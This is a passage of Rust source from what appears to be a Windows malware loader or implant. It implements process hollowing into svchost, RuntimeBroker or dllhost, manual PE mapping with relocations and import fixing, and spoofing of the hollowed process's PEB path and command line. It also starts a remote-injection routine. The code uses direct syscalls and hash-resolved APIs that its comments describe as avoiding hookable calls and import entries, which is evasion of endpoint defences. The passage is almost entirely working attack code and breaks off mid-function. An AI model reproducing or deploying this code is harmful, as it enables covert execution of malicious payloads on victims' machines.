                if alloc_status < 0 || str_buf.is_null() {
                    tracing::warn!(
                        "hollow_and_execute: failed to alloc remote buffer for \
                         ProcessParameters path, skipping update"
                    );
                } else {
                    // Write the wide path into the remote allocation.
                    let mut path_written: usize = 0;
                    let write_path = nt_syscall::syscall!(
                        "NtWriteVirtualMemory",
                        h_process as u64, str_buf as u64,
                        wide_path.as_ptr() as u64,
                        (wide_path.len() * 2) as u64,
                        &mut path_written as *mut _ as u64,
                    );
                    if write_path.unwrap_or(-1) < 0 {
                        tracing::warn!(
                            "hollow_and_execute: failed to write remote path buffer, \
                             skipping ProcessParameters update"
                        );
                    } else {
                        // Build the UNICODE_STRING struct to write.
                        // UNICODE_STRING on x64 = { u16 Length, u16 MaxLength, u32 _pad, u64 Buffer }
                        //   = 16 bytes total.
                        let path_byte_len_u16 = path_byte_len as u16;
                        let max_len = (wide_path.len() * 2) as u16;
                        let mut us_bytes = [0u8; 16];
                        us_bytes[0..2].copy_from_slice(&path_byte_len_u16.to_le_bytes());
                        us_bytes[2..4].copy_from_slice(&max_len.to_le_bytes());
                        // bytes 4..8 are padding (zero)
                        us_bytes[8..16].copy_from_slice(&(str_buf as usize).to_le_bytes());

                        // Update ImagePathName at RTL_USER_PROCESS_PARAMETERS +0x60.
                        let mut us_written: usize = 0;
                        let write_img = nt_syscall::syscall!(
                            "NtWriteVirtualMemory",
                            h_process as u64,
                            params_addr.add(0x60) as u64,
                            us_bytes.as_ptr() as u64,
                            16u64,
                            &mut us_written as *mut _ as u64,
                        );
                        if write_img.unwrap_or(-1) < 0 {
                            tracing::warn!(
                                "hollow_and_execute: failed to update ImagePathName, \
                                 NTSTATUS {:#010x}", write_img.unwrap_or(-1) as u32);
                        }

                        // Update CommandLine at RTL_USER_PROCESS_PARAMETERS +0x70.
                        let mut cl_written: usize = 0;
                        let write_cmd = nt_syscall::syscall!(
                            "NtWriteVirtualMemory",
                            h_process as u64,
                            params_addr.add(0x70) as u64,
                            us_bytes.as_ptr() as u64,
                            16u64,
                            &mut cl_written as *mut _ as u64,
                        );
                        if write_cmd.unwrap_or(-1) < 0 {
                            tracing::warn!(
                                "hollow_and_execute: failed to update CommandLine, \
                                 NTSTATUS {:#010x}", write_cmd.unwrap_or(-1) as u32);
                        }

                        if write_img.unwrap_or(-1) >= 0 && write_cmd.unwrap_or(-1) >= 0 {
                            tracing::debug!(
                                "hollow_and_execute: updated PEB ProcessParameters \
                                 ImagePathName/CommandLine to {}",
                                host_path
                            );
                        }
                    }
                }
            }
        }

        // Redirect the suspended thread's entry point to the hollowed payload.
        let mut ctx: winapi::um::winnt::CONTEXT = zeroed();
        ctx.ContextFlags = winapi::um::winnt::CONTEXT_FULL;
        let get_ctx_status = nt_syscall::syscall!(
            "NtGetContextThread", h_thread as u64, &mut ctx as *mut _ as u64,
        );
        match get_ctx_status {
            Ok(s) if s >= 0 => {
                ctx.Rip = (remote_base + entry_point_rva) as u64;
                let set_ctx_status = nt_syscall::syscall!(
                    "NtSetContextThread", h_thread as u64, &ctx as *const _ as u64,
                );
                match set_ctx_status {
                    Ok(s2) if s2 >= 0 => {}
                    Ok(s2) => {
                        nt_terminate_process!(h_process);
                        close_handle!(h_thread);
                        close_handle!(h_process);
                        return Err(anyhow!(
                            "hollow_and_execute: NtSetContextThread NTSTATUS {:#010x}",
                            s2 as u32));
                    }
                    Err(e) => {
                        nt_terminate_process!(h_process);
                        close_handle!(h_thread);
                        close_handle!(h_process);
                        return Err(anyhow!(
                            "hollow_and_execute: NtSetContextThread failed: {}", e));
                    }
                }
            }
            Ok(s) => {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: NtGetContextThread NTSTATUS {:#010x}",
                    s as u32));
            }
            Err(e) => {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: NtGetContextThread failed: {}", e));
            }
        }

        let resume_status = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        match resume_status {
            Ok(s) if s >= 0 => {}
            Ok(s) => {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: NtResumeThread NTSTATUS {:#010x}", s as u32));
            }
            Err(e) => {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: NtResumeThread failed: {}", e));
            }
        }

        close_handle!(h_thread);
        close_handle!(h_process);
    }
    Ok(())
}

#[cfg(windows)]
unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
    use std::mem::zeroed;
    use winapi::um::winnt::{
        IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS32,
        IMAGE_NT_OPTIONAL_HDR32_MAGIC, IMAGE_NT_SIGNATURE, MEM_COMMIT, MEM_RESERVE,
        PAGE_READWRITE, WOW64_CONTEXT, WOW64_CONTEXT_FULL,
    };
    // NtClose for handle cleanup.
    macro_rules! close_handle {
        ($h:expr) => {
            let _ = nt_syscall::syscall!("NtClose", $h as u64);
        };
    }

    let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
        return Err(anyhow!("hollow_and_execute: invalid DOS signature"));
    }
    let e_lfanew = (*dos).e_lfanew as usize;
    if e_lfanew + std::mem::size_of::<IMAGE_NT_HEADERS32>() > payload.len() {
        return Err(anyhow!("hollow_and_execute: PE32 payload too small for NT headers"));
    }

    let nt = (payload.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS32;
    if (*nt).Signature != IMAGE_NT_SIGNATURE {
        return Err(anyhow!("hollow_and_execute: invalid NT signature"));
    }
    let opt_magic = (*nt).OptionalHeader.Magic;
    if opt_magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC {
        return Err(anyhow!(
            "hollow_and_execute: expected PE32 payload (found OptionalHeader.Magic=0x{:x})",
            opt_magic
        ));
    }

    let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
    let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
    let entry_point_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;
    if image_size == 0 {
        return Err(anyhow!("hollow_and_execute: PE32 payload has SizeOfImage=0"));
    }
    if entry_point_rva >= image_size {
        return Err(anyhow!(
            "hollow_and_execute: PE32 entry point RVA {entry_point_rva:#x} is outside image size {image_size:#x}"
        ));
    }

    let image_end = (preferred_base as u64)
        .checked_add(image_size as u64)
        .ok_or_else(|| anyhow!("hollow_and_execute: PE32 image base+size overflow"))?;
    if image_end > (u32::MAX as u64 + 1) {
        return Err(anyhow!(
            "hollow_and_execute: PE32 image does not fit in 32-bit address space \
             (base={preferred_base:#x}, size={image_size:#x})"
        ));
    }

    // Resolve NT cross-process functions via direct syscalls — no Win32 IAT entries.
    macro_rules! nt_terminate { ($h:expr) => {
        let _ = nt_syscall::syscall!("NtTerminateProcess", $h as u64, 1u64);
    }; }

    // Prefer SysWOW64 path for 32-bit host process; fall back through candidate list.
    let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
    let candidates = vec![
        format!(r"{}\SysWOW64\svchost.exe", sysroot),
        format!(r"{}\SysWOW64\RuntimeBroker.exe", sysroot),
        format!(r"{}\SysWOW64\dllhost.exe", sysroot),
        format!(r"{}\System32\svchost.exe", sysroot),
    ];
    let (h_process, h_thread) = {
        let mut result: Result<(*mut c_void, *mut c_void)> =
            Err(anyhow!("hollow_and_execute(pe32): all host process candidates failed"));
        for path in &candidates {
            match create_suspended_process_nt(path) {
                Ok(handles) => { result = Ok(handles); break; }
                Err(e) => tracing::debug!(
                    "hollow_and_execute(pe32): candidate {} failed: {}", path, e),
            }
        }
        result?
    };

    // Hollow original image via NtUnmapViewOfSection when possible.
    // Read the 32-bit PEB address (Ebx in WOW64 initial context) via NT direct syscall.
    {
        let mut ctx: WOW64_CONTEXT = zeroed();
        ctx.ContextFlags = WOW64_CONTEXT_FULL;
        let get_ctx_status = nt_syscall::syscall!(
            "NtGetContextThread", h_thread as u64, &mut ctx as *mut _ as u64,
        );
        match get_ctx_status {
            Ok(s) if s >= 0 => {
                let peb_ptr = ctx.Ebx as usize as *const u8;
                let mut remote_image_base: u32 = 0;
                let mut rd: usize = 0;
                let _ = nt_syscall::syscall!(
                    "NtReadVirtualMemory",
                    h_process as u64, peb_ptr.add(0x8) as u64,
                    &mut remote_image_base as *mut _ as u64,
                    std::mem::size_of::<u32>() as u64,
                    &mut rd as *mut _ as u64,
                );
                if remote_image_base == 0 {
                    tracing::warn!(
                        "hollow_and_execute(pe32): remote_image_base is NULL; skipping unmap");
                } else {
                    let us = nt_syscall::syscall!(
                        "NtUnmapViewOfSection",
                        h_process as u64, remote_image_base as u64,
                    ).unwrap_or(-1);
                    if us < 0 {
                        tracing::warn!(
                            "hollow_and_execute(pe32): NtUnmapViewOfSection NTSTATUS {:#010x}; continuing",
                            us as u32);
                    }
                }
            }
            _ => {
                tracing::warn!(
                    "hollow_and_execute(pe32): NtGetContextThread failed; skipping unmap");
            }
        }
    }

    // Allocate RW first; execute permissions applied per-section later.
    let mut alloc_base = preferred_base as *mut c_void;
    let mut alloc_size = image_size;
    let s = nt_syscall::syscall!(
        "NtAllocateVirtualMemory",
        h_process as u64, &mut alloc_base as *mut _ as u64,
        0u64, &mut alloc_size as *mut _ as u64,
        (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
    ).unwrap_or(-1);
    let remote_base_ptr = if s < 0 || alloc_base.is_null() {
        let mut fb: *mut c_void = std::ptr::null_mut();
        let mut fb_sz = image_size;
        let s2 = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_process as u64, &mut fb as *mut _ as u64,
            0u64, &mut fb_sz as *mut _ as u64,
            (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
        ).unwrap_or(-1);
        if s2 < 0 || fb.is_null() {
            nt_terminate!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!("NtAllocateVirtualMemory failed for PE32 hollowing: {:#010x}", s2 as u32));
        }
        fb
    } else {
        alloc_base
    };

    let remote_base = remote_base_ptr as usize;
    let remote_base32 = u32::try_from(remote_base)
        .map_err(|_| anyhow!("hollow_and_execute: allocated PE32 base above 4GB ({remote_base:#x})"))?;
    let mut written: usize = 0;

    if nt_syscall::syscall!(
        "NtWriteVirtualMemory",
        h_process as u64, remote_base_ptr as u64,
        payload.as_ptr() as u64,
        (*nt).OptionalHeader.SizeOfHeaders as u64,
        &mut written as *mut _ as u64,
    ).unwrap_or(-1) < 0 {
        nt_terminate!(h_process);
        close_handle!(h_thread);
        close_handle!(h_process);
        return Err(anyhow!("NtWriteVirtualMemory(headers, pe32) failed"));
    }

    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first_section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS32>())
        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
    for i in 0..num_sections {
        let sec = &*first_section.add(i);
        let raw_off = sec.PointerToRawData as usize;
        let raw_sz  = sec.SizeOfRawData as usize;
        let virt_sz = *sec.Misc.VirtualSize() as usize;
        let copy_sz = raw_sz.min(virt_sz);
        if raw_off == 0 || raw_sz == 0 || raw_off + copy_sz > payload.len() || copy_sz == 0 {
            continue;
        }
        let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
        if nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_process as u64, dst as u64,
            payload.as_ptr().add(raw_off) as u64,
            copy_sz as u64,
            &mut written as *mut _ as u64,
        ).unwrap_or(-1) < 0 {
            nt_terminate!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!("NtWriteVirtualMemory(section {}, pe32) failed", i));
        }
    }

    let delta = remote_base as isize - preferred_base as isize;
    if delta != 0 {
        let reloc_dir = &(*nt).OptionalHeader.DataDirectory
            [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
        if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
            nt_terminate!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "hollow_and_execute(pe32): preferred base unavailable and PE has no reloc directory"));
        }
        apply_relocations_remote32(h_process, remote_base, nt, payload, delta)?;
    }

    fix_iat_remote32(h_process, remote_base, nt, payload, &mut written)?;
    apply_section_protections32(h_process, remote_base, nt);

    let mut ctx: WOW64_CONTEXT = zeroed();
    ctx.ContextFlags = WOW64_CONTEXT_FULL;
    let get_ctx_status = nt_syscall::syscall!(
        "NtGetContextThread", h_thread as u64, &mut ctx as *mut _ as u64,
    );
    match get_ctx_status {
        Ok(s) if s >= 0 => {
            let peb_ptr = ctx.Ebx as usize as *const u8;
            let _ = nt_syscall::syscall!(
                "NtWriteVirtualMemory",
                h_process as u64, peb_ptr.add(0x8) as u64,
                &remote_base32 as *const _ as u64,
                std::mem::size_of::<u32>() as u64,
                &mut written as *mut _ as u64,
            );

            ctx.Eax = remote_base32.wrapping_add(entry_point_rva as u32);
            let set_ctx_status = nt_syscall::syscall!(
                "NtSetContextThread", h_thread as u64, &ctx as *const _ as u64,
            );
            if let Err(e) = set_ctx_status {
                tracing::warn!("hollow_and_execute(pe32): NtSetContextThread failed: {}", e);
            } else if let Ok(s2) = set_ctx_status {
                if s2 < 0 {
                    tracing::warn!(
                        "hollow_and_execute(pe32): NtSetContextThread NTSTATUS {:#010x}; continuing",
                        s2 as u32);
                }
            }
        }
        _ => {
            tracing::warn!(
                "hollow_and_execute(pe32): NtGetContextThread failed before PEB image-base update; skipping PEB write");
        }
    }

    let _ = nt_syscall::syscall!(
        "NtFlushInstructionCache",
        h_process as u64, remote_base as u64,
        (*nt).OptionalHeader.SizeOfImage as u64,
    );

    let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);

    close_handle!(h_thread);
    close_handle!(h_process);
    Ok(())
}

#[cfg(windows)]
unsafe fn apply_relocations_remote32(
    hprocess: *mut c_void,
    remote_base: usize,
    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS32,
    payload: &[u8],
    delta: isize,
) -> Result<()> {
    let reloc_dir = &(*nt).OptionalHeader.DataDirectory
        [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
    if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
        return Ok(());
    }

    let reloc_file_off = rva_to_file_offset32(reloc_dir.VirtualAddress as usize, nt);
    let reloc_end_off = reloc_file_off + reloc_dir.Size as usize;
    if reloc_end_off > payload.len() {
        return Ok(());
    }

    let mut offset = reloc_file_off;
    while offset + 8 <= reloc_end_off {
        let page_rva =
            u32::from_le_bytes(payload[offset..offset + 4].try_into().unwrap()) as usize;
        let block_size =
            u32::from_le_bytes(payload[offset + 4..offset + 8].try_into().unwrap()) as usize;
        if block_size < 8 {
            break;
        }
        let entries = (block_size - 8) / 2;
        for i in 0..entries {
            let entry_off = offset + 8 + i * 2;
            if entry_off + 2 > reloc_end_off {
                break;
            }
            let entry = u16::from_le_bytes(payload[entry_off..entry_off + 2].try_into().unwrap());
            let typ = (entry >> 12) as u8;
            let rel = (entry & 0x0FFF) as usize;
            let target = (remote_base + page_rva + rel) as *mut c_void;
            match typ {
                // IMAGE_REL_BASED_HIGHLOW (PE32): 32-bit absolute VA.
                // Use u32 wrapping arithmetic — `delta as u32` takes the low 32
                // bits of the signed delta, giving correct modular results even
                // when delta exceeds i32::MAX (e.g. remote_base near 0xC000_0000).
                3 => {
                    let mut val: u32 = 0;
                    let mut rd: usize = 0;
                    let _ = nt_syscall::syscall!(
                        "NtReadVirtualMemory",
                        hprocess as u64, target as u64,
                        &mut val as *mut _ as u64, 4u64,
                        &mut rd as *mut _ as u64,
                    );
                    let patched = val.wrapping_add(delta as u32);
                    let mut wr: usize = 0;
                    let _ = nt_syscall::syscall!(
                        "NtWriteVirtualMemory",
                        hprocess as u64, target as u64,
                        &patched as *const _ as u64, 4u64,
                        &mut wr as *mut _ as u64,
                    );
                }
                // IMAGE_REL_BASED_DIR64 (accepted for completeness)
                10 => {
                    let mut val: u64 = 0;
                    let mut rd: usize = 0;
                    let _ = nt_syscall::syscall!(
                        "NtReadVirtualMemory",
                        hprocess as u64, target as u64,
                        &mut val as *mut _ as u64, 8u64,
                        &mut rd as *mut _ as u64,
                    );
                    val = val.wrapping_add(delta as u64);
                    let mut wr: usize = 0;
                    let _ = nt_syscall::syscall!(
                        "NtWriteVirtualMemory",
                        hprocess as u64, target as u64,
                        &val as *const _ as u64, 8u64,
                        &mut wr as *mut _ as u64,
                    );
                }
                _ => {}
            }
        }
        offset += block_size;
    }
    Ok(())
}

#[cfg(windows)]
unsafe fn fix_iat_remote32(
    hprocess: *mut c_void,
    remote_base: usize,
    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS32,
    payload: &[u8],
    written: &mut usize,
) -> Result<()> {
    let import_dir = &(*nt).OptionalHeader.DataDirectory
        [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    if import_dir.VirtualAddress == 0 {
        return Ok(());
    }

    let mut desc_off = rva_to_file_offset32(import_dir.VirtualAddress as usize, nt);
    loop {
        if desc_off + 20 > payload.len() {
            break;
        }
        let orig_first_thunk_rva =
            u32::from_le_bytes(payload[desc_off..desc_off + 4].try_into().unwrap()) as usize;
        let name_rva =
            u32::from_le_bytes(payload[desc_off + 12..desc_off + 16].try_into().unwrap()) as usize;
        let first_thunk_rva =
            u32::from_le_bytes(payload[desc_off + 16..desc_off + 20].try_into().unwrap()) as usize;
        if name_rva == 0 {
            break;
        }

        let name_off = rva_to_file_offset32(name_rva, nt);
        let first_thunk_off = rva_to_file_offset32(first_thunk_rva, nt);
        let thunk_rva_off = if orig_first_thunk_rva != 0 {
            rva_to_file_offset32(orig_first_thunk_rva, nt)
        } else {
            first_thunk_off
        };
        if name_off >= payload.len() {
            desc_off += 20;
            continue;
        }

        let dll_name_bytes = &payload[name_off..];
        let null_pos = dll_name_bytes
            .iter()
            .position(|&b| b == 0)
            .unwrap_or(dll_name_bytes.len());
        let dll_name_str = match std::str::from_utf8(&dll_name_bytes[..null_pos]) {
            Ok(s) => s,
            Err(_) => {
                desc_off += 20;
                continue;
            }
        };

        let mut dll_name_nul = dll_name_str.to_ascii_lowercase().into_bytes();
        dll_name_nul.push(0);
        let hash = pe_resolve::hash_str(&dll_name_nul);
        let dll_base = pe_resolve::get_module_handle_by_hash(hash)
            .or_else(|| {
                let h = ldr_load_local(dll_name_str);
                if h == 0 { None } else { Some(h) }
            })
            .unwrap_or(0);
        if dll_base == 0 {
            tracing::warn!("fix_iat_remote32: could not find/load {}", dll_name_str);
            desc_off += 20;
            continue;
        }

        let mut thunk_off = thunk_rva_off;
        let mut iat_rva = first_thunk_rva;
        loop {
            if thunk_off + 4 > payload.len() {
                break;
            }
            let thunk_val =
                u32::from_le_bytes(payload[thunk_off..thunk_off + 4].try_into().unwrap());
            if thunk_val == 0 {
                break;
            }

            let func_addr: usize = if (thunk_val & 0x8000_0000) != 0 {
                let ord = (thunk_val & 0xFFFF) as u32;
                let ep = local_get_export_addr_by_ordinal(dll_base, ord);
                if ep.is_null() {
                    tracing::warn!(
                        "fix_iat_remote32: ordinal {} in {} unresolved",
                        ord,
                        dll_name_str
                    );
                    0
                } else {
                    ep as usize
                }
            } else {
                let ibn_rva = thunk_val as usize;
                let ibn_off = rva_to_file_offset32(ibn_rva, nt);
                if ibn_off + 2 >= payload.len() {
                    thunk_off += 4;
                    iat_rva += 4;
                    continue;
                }
                let name_start = ibn_off + 2;
                let name_bytes = &payload[name_start..];
                let nlen = name_bytes
                    .iter()
                    .position(|&b| b == 0)
                    .unwrap_or(name_bytes.len());
                let mut name_null = name_bytes[..nlen].to_vec();
                name_null.push(0);
                let hash = pe_resolve::hash_str(&name_null);
                match pe_resolve::get_proc_address_by_hash(dll_base, hash) {
                    Some(addr) => addr,
                    None => {
                        tracing::warn!(
                            "fix_iat_remote32: {}!{} unresolved via PEB walk",
                            dll_name_str,
                            String::from_utf8_lossy(&name_null[..name_null.len().saturating_sub(1)])
                        );
                        0
                    }
                }
            };

            if func_addr != 0 {
                let func_addr32 = u32::try_from(func_addr).map_err(|_| {
                    anyhow!(
                        "fix_iat_remote32: resolved address {func_addr:#x} for {} exceeds 32-bit range",
                        dll_name_str
                    )
                })?;
                let iat_remote = (remote_base + iat_rva) as *mut c_void;
                let _ = nt_syscall::syscall!(
                    "NtWriteVirtualMemory",
                    hprocess as u64, iat_remote as u64,
                    &func_addr32 as *const _ as u64, 4u64,
                    written as *mut _ as u64,
                );
            }

            thunk_off += 4;
            iat_rva += 4;
        }

        desc_off += 20;
    }

    Ok(())
}

#[cfg(windows)]
unsafe fn apply_section_protections32(
    hprocess: *mut c_void,
    remote_base: usize,
    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS32,
) {
    use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_READONLY, PAGE_READWRITE};

    const SCN_EXEC: u32 = 0x2000_0000;
    const SCN_WRITE: u32 = 0x8000_0000;

    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first_section = (nt as usize + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS32>())
        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
    for i in 0..num_sections {
        let sec = &*first_section.add(i);
        let chars = sec.Characteristics;
        let protect = match (chars & SCN_EXEC != 0, chars & SCN_WRITE != 0) {
            (true, true)   => PAGE_EXECUTE_READ,
            (true, false)  => PAGE_EXECUTE_READ,
            (false, true)  => PAGE_READWRITE,
            (false, false) => PAGE_READONLY,
        };
        let virt_size = (*sec.Misc.VirtualSize() as usize).max(sec.SizeOfRawData as usize);
        if virt_size == 0 { continue; }
        let mut addr = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
        let mut sz = virt_size;
        let mut old = 0u32;
        let _ = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            hprocess as u64, &mut addr as *mut _ as u64,
            &mut sz as *mut _ as u64, protect as u64,
            &mut old as *mut _ as u64,
        );
    }
}

#[cfg(windows)]
unsafe fn apply_relocations_remote(
    hprocess: *mut c_void,
    remote_base: usize,
    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS64,
    payload: &[u8],
    delta: isize,
) -> Result<()> {
    let reloc_dir = &(*nt).OptionalHeader.DataDirectory
        [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
    if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
        return Ok(());
    }

    // Convert the relocation-directory RVA to a file offset.  The data-directory
    // VirtualAddress is a PE RVA, not a raw file offset; they differ when the
    // .reloc section has a different PointerToRawData than VirtualAddress.
    let reloc_file_off = rva_to_file_offset(reloc_dir.VirtualAddress as usize, nt);
    let reloc_end_off = reloc_file_off + reloc_dir.Size as usize;
    if reloc_end_off > payload.len() {
        return Ok(());
    }

    let mut offset = reloc_file_off;
    while offset + 8 <= reloc_end_off {
        let page_rva = u32::from_le_bytes(payload[offset..offset + 4].try_into().unwrap()) as usize;
        let block_size =
            u32::from_le_bytes(payload[offset + 4..offset + 8].try_into().unwrap()) as usize;
        if block_size < 8 {
            break;
        }
        let entries = (block_size - 8) / 2;
        for i in 0..entries {
            let entry_off = offset + 8 + i * 2;
            if entry_off + 2 > reloc_end_off {
                break;
            }
            let entry = u16::from_le_bytes(payload[entry_off..entry_off + 2].try_into().unwrap());
            let typ = (entry >> 12) as u8;
            let rel = (entry & 0x0FFF) as usize;
            let target = (remote_base + page_rva + rel) as *mut c_void;
            match typ {
                // IMAGE_REL_BASED_DIR64 (PE32+)
                10 => {
                    let mut val: u64 = 0;
                    let mut rd: usize = 0;
                    let _ = nt_syscall::syscall!(
                        "NtReadVirtualMemory",
                        hprocess as u64, target as u64,
                        &mut val as *mut _ as u64, 8u64,
                        &mut rd as *mut _ as u64,
                    );
                    val = val.wrapping_add(delta as u64);
                    let mut wr: usize = 0;
                    let _ = nt_syscall::syscall!(
                        "NtWriteVirtualMemory",
                        hprocess as u64, target as u64,
                        &val as *const _ as u64, 8u64,
                        &mut wr as *mut _ as u64,
                    );
                }
                // IMAGE_REL_BASED_HIGHLOW (PE32): 32-bit absolute VA.
                // Use u32 wrapping arithmetic — `delta as u32` takes the low 32
                // bits of the signed delta, giving correct modular results even
                // when delta exceeds i32::MAX (e.g. remote_base near 0xC000_0000).
                3 => {
                    let mut val: u32 = 0;
                    let mut rd: usize = 0;
                    let _ = nt_syscall::syscall!(
                        "NtReadVirtualMemory",
                        hprocess as u64, target as u64,
                        &mut val as *mut _ as u64, 4u64,
                        &mut rd as *mut _ as u64,
                    );
                    let patched = val.wrapping_add(delta as u32);
                    let mut wr: usize = 0;
                    let _ = nt_syscall::syscall!(
                        "NtWriteVirtualMemory",
                        hprocess as u64, target as u64,
                        &patched as *const _ as u64, 4u64,
                        &mut wr as *mut _ as u64,
                    );
                }
                _ => {}
            }
        }
        offset += block_size;
    }
    Ok(())
}

/// Inject a PE or shellcode payload into an existing process identified by PID.
#[cfg(windows)]
pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
    use std::ptr::null_mut;
    use winapi::shared::basetsd::SIZE_T;
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
    use winapi::um::processthreadsapi::{FlushInstructionCache, OpenProcess};
    use winapi::um::winnt::{
        IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE, MEM_COMMIT,
        MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_CREATE_THREAD,
        PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
    };

    unsafe {
        let hprocess = OpenProcess(
            PROCESS_VM_OPERATION
                | PROCESS_VM_WRITE
                | PROCESS_VM_READ
                | PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION,
            0,
            pid,
        );
        if hprocess.is_null() {
            return Err(anyhow!(
                "OpenProcess(pid={}) failed: {}",
                pid,
                winapi::um::errhandlingapi::GetLastError()
            ));
        }

        // Resolve NtClose for handle cleanup; fall back to CloseHandle
        let ntdll_base2 =
            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
                .unwrap_or(0);
        let nt_close_addr2 = if ntdll_base2 != 0 {
            pe_resolve::get_proc_address_by_hash(ntdll_base2, pe_resolve::hash_str(b"NtClose\0"))
        } else {
            None
        };
        macro_rules! close_h {
            ($h:expr) => {
                if let Some(addr) = nt_close_addr2 {
                    type NtCloseFn = unsafe extern "system" fn(*mut c_void) -> i32;
                    let f: NtCloseFn = std::mem::transmute(addr as *const ());
                    f($h);
                } else {
                    CloseHandle($h);
                }
            };
        }

        // Resolve NtCreateThreadEx via PEB walk to avoid hookable CreateRemoteThread
        let ntdll_base =
            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
                .unwrap_or(0);
        if ntdll_base == 0 {
            close_h!(hprocess);
            return Err(anyhow!("inject_into_process: ntdll not found"));
        }
        let ntcreate_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtCreateThreadEx\0"),
        )
        .ok_or_else(|| anyhow!("inject_into_process: NtCreateThreadEx not found"))?;
        type NtCreateThreadExFn = unsafe extern "system" fn(
            *mut *mut c_void,
            u32,
            *mut c_void,
            *mut c_void,
            *mut c_void,
            *mut c_void,
            u32,
            usize,
            usize,
            usize,
            *mut c_void,
        ) -> i32;
        let nt_create_thread: NtCreateThreadExFn = std::mem::transmute(ntcreate_addr);

        #[repr(C)]
        struct ProcessBasicInformation {
            reserved1: *mut c_void,
            peb_base_address: *mut c_void,
            reserved2: [*mut c_void; 2],
            unique_process_id: usize,
            reserved3: *mut c_void,
        }
        type NtQueryInformationProcessFn = unsafe extern "system" fn(
            *mut c_void,
            u32,
            *mut c_void,
            u32,
            *mut u32,
        ) -> i32;
        let nt_query_information_process: Option<NtQueryInformationProcessFn> =
            pe_resolve::get_proc_address_by_hash(
                ntdll_base,
                pe_resolve::hash_str(b"NtQueryInformationProcess\0"),
            )
            .map(|p| std::mem::transmute::<*const (), NtQueryInformationProcessFn>(p as *const ()));

        fn payload_has_valid_pe_headers(payload: &[u8]) -> bool {
            if payload.len() < 0x40 || payload[0] != b'M' || payload[1] != b'Z' {
                return false;
            }

            let e_lfanew = u32::from_le_bytes([
                payload[0x3c],
                payload[0x3d],
                payload[0x3e],
                payload[0x3f],
            ]) as usize;

            if (e_lfanew & 0x3) != 0 {
                return false;
            }

            let sig_end = match e_lfanew.checked_add(4) {
                Some(v) => v,
                None => return false,
            };
            if sig_end > payload.len() {
                return false;
            }

            payload[e_lfanew..sig_end] == *b"PE\0\0"
        }

        // Determine if this is a PE image or raw shellcode
        let is_pe = payload_has_valid_pe_headers(payload);
        if is_pe {
            let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
            if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
                close_h!(hprocess);
                return Err(anyhow!("inject_into_process: invalid DOS magic"));
            }
            let nt =
                (payload.as_ptr() as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;

            let nt_off = (*dos).e_lfanew as usize;
            if nt_off.saturating_add(std::mem::size_of::<IMAGE_NT_HEADERS64>()) > payload.len() {
